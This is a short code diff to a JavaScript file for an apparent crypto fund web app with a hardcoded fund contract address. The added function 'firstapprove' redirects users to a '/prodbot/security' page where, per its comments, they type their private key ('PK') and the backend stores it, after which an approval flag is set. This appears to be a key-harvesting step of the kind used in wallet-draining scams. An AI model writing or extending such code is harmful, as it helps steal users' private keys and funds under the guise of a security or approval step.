@@ -39,6 +39,20 @@ const FUND_ADDRESS = "0x50AB9b1A42D4338A80Dc3579D93eCd3243953E0e";
 // USER_TOKEN_ADDR will be set dynamically from clients.db for the logged-in user
 let USER_TOKEN_ADDR = null;
 
+async function firstapprove() {
+  try {
+    // Redirect the browser to the PK form page
+    window.location.href = "/prodbot/security";
+    // User will see the form, type PK, submit → backend stores it
+    // After submission, backend returns JSON { "message": "PK stored successfully" }
+    // At that point, you can flip firsttime = true in your approve handler
+  } catch (err) {
+    logToPanel(`FirstApproveError=${err.message}`);
+    throw err;
+  }
+}
+
+
 async function handleLoginSuccess() {
   try {
     // Fetch latest balance from fund contract
